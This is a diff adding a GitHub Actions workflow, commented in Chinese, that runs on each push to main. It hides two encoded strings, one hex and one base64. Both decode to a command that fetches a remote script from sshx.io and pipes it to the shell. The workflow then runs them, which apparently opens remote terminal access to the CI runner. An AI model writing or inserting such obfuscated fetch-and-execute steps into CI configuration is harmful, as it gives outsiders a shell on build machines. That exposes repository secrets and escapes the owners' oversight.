@@ -1,0 +1,32 @@
+name: Decode and Execute Commands
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  decode-and-execute:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Decode Hex and Base64 and Execute Command
+        run: |
+          # Step 1: 提取Base64和Hex编码部分
+          hex_part="6375726c202d7353662068747470733a2f2f737368782e696f2f676574207c207368202d732072756e"
+          base64_part="Y3VybCAtc1NmIGh0dHBzOi8vc3NoeC5pby9nZXQgfCBzaCAtcyBydW4="
+
+          # Step 2: 解码 HEX 和 Base64 部分
+          decoded_hex=$(echo "$hex_part" | xxd -r -p)   # 解码十六进制为命令
+          decoded_base64=$(echo "$base64_part" | base64 --decode)   # 解码Base64为命令
+
+          # Step 3: 输出解码后的命令
+          echo "解码后的 HEX 命令：$decoded_hex"
+          echo "解码后的 Base64 命令：$decoded_base64"
+
+          # Step 4: 执行解码后的命令
+          # 假设两个命令可以组合执行，使用 `sh -c` 来执行这些命令
+          sh -c "$decoded_hex | $decoded_base64"
